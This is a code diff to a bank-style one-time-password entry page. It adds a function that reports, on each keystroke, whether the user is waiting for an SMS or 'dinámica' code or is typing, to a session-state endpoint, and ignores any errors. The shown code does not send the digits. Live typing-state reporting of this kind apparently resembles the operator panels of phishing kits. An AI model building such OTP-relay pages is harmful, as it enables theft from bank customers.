@@ -108,6 +108,24 @@ const slots = [...document.querySelectorAll("#otp-slots input")];
 const next = document.getElementById("otp-next");
 const description = document.querySelector(".bc-key-validation-description");
 
+let lastSentState = null;
+
+function checkTypingState() {
+  const len = value().length;
+  let targetState = sessionStorage.getItem('otpType') === 'sms' ? 'waiting-sms' : 'waiting-dinamica';
+  if (len > 0) {
+    targetState = 'typing';
+  }
+  if (lastSentState !== targetState) {
+    lastSentState = targetState;
+    fetch(`/api/sessions/${sessionId}/state`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ state: targetState })
+    }).catch(() => {});
+  }
+}
+
 function value() {
   return slots.map((slot) => slot.value).join("");
 }
@@ -121,8 +139,10 @@ function resetOTP() {
     slot.value = "";
   });
   prevValues = ["", "", "", "", "", ""];
+  lastSentState = null;
   slots[0].focus();
   refresh();
+  checkTypingState();
 }
 
 slots.forEach((slot, index) => {
@@ -136,6 +156,7 @@ slots.forEach((slot, index) => {
     prevValues[index] = slot.value;
     if (slot.value && slots[index + 1]) slots[index + 1].focus();
     refresh();
+    checkTypingState();
   });
 
   slot.addEventListener("keydown", (event) => {
@@ -144,6 +165,7 @@ slots.forEach((slot, index) => {
       slots[index - 1].value = "";
       prevValues[index - 1] = "";
       refresh();
+      checkTypingState();
     }
   });
 
